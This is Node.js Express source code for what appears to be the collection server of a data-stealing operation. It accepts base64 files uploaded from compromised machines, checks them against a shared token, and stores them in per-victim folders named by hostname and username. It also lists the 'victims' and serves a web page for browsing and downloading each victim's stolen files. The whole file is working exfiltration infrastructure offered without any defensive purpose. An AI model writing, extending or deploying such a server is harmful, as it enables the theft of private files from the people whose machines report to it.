const fs = require('fs').promises;
const fsSync = require('fs');
const path = require('path');
const express = require('express');
const cors = require('cors');
const { loadConfig } = require('./lib/config');

const app = express();
const config = loadConfig();

app.use(cors());
app.use(express.json({ limit: '50mb' }));

const VICTIMS_DIR = process.env.RAILWAY_ENVIRONMENT
    ? '/tmp/victims'
    : path.join(__dirname, 'victims');

const SECRET_TOKEN = config.secretToken;

(async () => {
    try {
        if (!fsSync.existsSync(VICTIMS_DIR)) {
            fsSync.mkdirSync(VICTIMS_DIR, { recursive: true });
        }
        console.log(`Victims storage: ${VICTIMS_DIR}`);
        console.log(`Public URL (from config): ${config.publicUrl}`);
    } catch (err) {
        console.error('Failed to create victims folder:', err);
        process.exit(1);
    }
})();

function victimRootResolved(safeId) {
    return path.resolve(path.join(VICTIMS_DIR, path.basename(safeId)));
}

async function listVictimDirs() {
    const victims = await fs.readdir(VICTIMS_DIR);
    const dirs = [];
    for (const v of victims) {
        const stat = await fs.stat(path.join(VICTIMS_DIR, v));
        if (stat.isDirectory()) {
            dirs.push(v);
        }
    }
    return dirs;
}

app.get('/api/health', (req, res) => {
    res.json({ ok: true, publicUrl: config.publicUrl });
});

app.get('/api/victims', async (req, res) => {
    try {
        const victims = await listVictimDirs();
        res.json({ victims });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: 'Failed to list victims' });
    }
});

async function handleSend(req, res) {
    try {
        const { hostname, username, token, file, filename, content } = req.body;
        if (token !== SECRET_TOKEN) {
            return res.status(403).json({ error: 'Unauthorized' });
        }
        if (!file && !content) {
            return res.status(400).json({ error: 'No file provided' });
        }

        const safeFolder = path.basename(`${hostname}_${username}`);
        const victimDir = path.join(VICTIMS_DIR, safeFolder);
        const safeFilename =
            filename ||
            (file && file.name ? path.basename(file.name) : null) ||
            'upload.bin';
        const filePath = path.join(victimDir, safeFilename);
        let savedName = safeFilename;

        try {
            await fs.mkdir(victimDir, { recursive: true });
            if (content) {
                await fs.writeFile(filePath, content, 'base64');
            } else if (file && file.path) {
                await fs.copyFile(file.path, filePath);
            } else if (file && file.content) {
                savedName = file.name ? path.basename(file.name) : safeFilename;
                await fs.writeFile(path.join(victimDir, savedName), file.content, 'base64');
            } else {
                return res.status(400).json({ error: 'No file provided' });
            }
            console.log(`[+] ${safeFolder} — saved ${savedName}`);
            res.json({ success: true });
        } catch (err) {
            console.error('Failed to save file:', err);
            res.status(500).json({ error: 'Write failed' });
        }
    } catch (err) {
        console.error('Failed to process request:', err);
        res.status(500).send('Internal Server Error');
    }
}

app.post('/send', handleSend);
app.post('/api/send', handleSend);

app.get(/^\/victim\/([^/]+)\/(.+)/, async (req, res) => {
    try {
        const safeId = path.basename(req.params[0]);
        const subPath = req.params[1].replace(/\\/g, '/');
        if (subPath.includes('..')) {
            return res.status(400).send('Invalid path');
        }

        const victimDir = victimRootResolved(safeId);
        const fullPath = path.resolve(path.join(victimDir, subPath));

        if (!fullPath.startsWith(victimDir)) {
            return res.status(403).send('Forbidden');
        }

        try {
            const stats = await fs.stat(fullPath);
            if (stats.isDirectory()) {
                const files = await fs.readdir(fullPath);
                const backLink = subPath
                    ? `/victim/${safeId}/${path.dirname(subPath).replace(/\\/g, '/')}`
                    : `/victim/${safeId}`;
                res.send(
                    `<h2>Folder: ${subPath || safeId}</h2><a href="${backLink}">⬅ Back</a><ul>${files
                        .map((f) => {
                            const itemPath = subPath ? `${subPath}/${f}` : f;
                            const itemFullPath = path.join(fullPath, f);
                            const isDir = fsSync.statSync(itemFullPath).isDirectory();
                            return `<li><a href="/victim/${safeId}/${itemPath.replace(/\\/g, '/')}${
                                isDir ? '/' : ''
                            }">${f}</a></li>`;
                        })
                        .join('')}</ul>`
                );
                return;
            }
        } catch (err) {
            /* fall through to download */
        }

        res.download(fullPath);
    } catch (err) {
        console.error('Failed to process request:', err);
        res.status(500).send('Internal Server Error');
    }
});

app.get('/victim/:id', async (req, res) => {
    try {
        const safeId = path.basename(req.params.id);
        const victimDir = victimRootResolved(safeId);

        let files;
        try {
            files = await fs.readdir(victimDir);
        } catch (err) {
            console.error('Failed to read victim folder:', err);
            return res.status(404).send('Not found');
        }

        res.send(
            `<h2>Victim: ${safeId}</h2><ul>${files
                .map(
                    (f) =>
                        `<li><a href="/victim/${safeId}/${f.replace(/\\/g, '/')}">${f}</a></li>`
                )
                .join('')}</ul>`
        );
    } catch (err) {
        console.error('Failed to process request:', err);
        res.status(500).send('Internal Server Error');
    }
});

app.use(express.static(path.join(__dirname, 'public')));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Listening on port ${PORT}`));
